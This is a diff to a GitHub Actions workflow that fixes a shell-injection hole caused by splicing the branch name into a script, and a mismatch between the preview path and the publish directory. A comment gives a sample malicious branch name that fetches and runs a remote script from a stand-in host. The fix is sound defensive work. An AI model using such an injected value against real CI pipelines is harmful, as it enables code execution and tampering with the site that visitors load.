@@ -21,14 +21,31 @@ jobs:
       - run: npm ci
 
       - name: Set base path
+        # The branch name reaches the script as an environment variable, never
+        # as text spliced into it. `${{ }}` is substituted before the shell
+        # runs, and a git ref may legally contain $, backticks, parentheses and
+        # semicolons — so a branch named `x$(curl evil.sh|sh)` used to execute
+        # on a runner holding a contents:write token, which is push access to
+        # gh-pages and therefore to what every visitor's browser runs. The
+        # sanitize below never protected against this: it ran after the
+        # substitution had already happened.
+        env:
+          BRANCH: ${{ github.ref_name }}
         run: |
-          if [ "${{ github.ref_name }}" = "main" ]; then
-            echo "VITE_BASE_PATH=/metronome/" >> $GITHUB_ENV
+          if [ "$BRANCH" = "main" ]; then
+            echo "VITE_BASE_PATH=/metronome/" >> "$GITHUB_ENV"
+            echo "DEST_DIR=." >> "$GITHUB_ENV"
           else
-            BRANCH="${{ github.ref_name }}"
-            # Sanitize branch name for use in URL
-            SAFE_BRANCH=$(echo "$BRANCH" | sed 's/[^a-zA-Z0-9._-]/-/g')
-            echo "VITE_BASE_PATH=/metronome/preview/${SAFE_BRANCH}/" >> $GITHUB_ENV
+            # One sanitized name, used for both the URL and the publish
+            # directory. They were derived separately before — the base path
+            # sanitized, the directory raw — so a branch like `feature/x`
+            # published to preview/feature/x/ while the app looked for its
+            # assets under preview/feature-x/, and the preview loaded blank.
+            # printf rather than echo: echo mangles backslashes and leading
+            # dashes in some shells.
+            SAFE_BRANCH=$(printf '%s' "$BRANCH" | sed 's/[^a-zA-Z0-9._-]/-/g')
+            echo "VITE_BASE_PATH=/metronome/preview/${SAFE_BRANCH}/" >> "$GITHUB_ENV"
+            echo "DEST_DIR=preview/${SAFE_BRANCH}" >> "$GITHUB_ENV"
           fi
 
       - name: Install rsvg-convert
@@ -41,5 +58,5 @@ jobs:
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
           publish_dir: ./dist
-          destination_dir: ${{ github.ref_name == 'main' && '.' || format('preview/{0}', github.ref_name) }}
+          destination_dir: ${{ env.DEST_DIR }}
           keep_files: true  # prevents branches from wiping each other
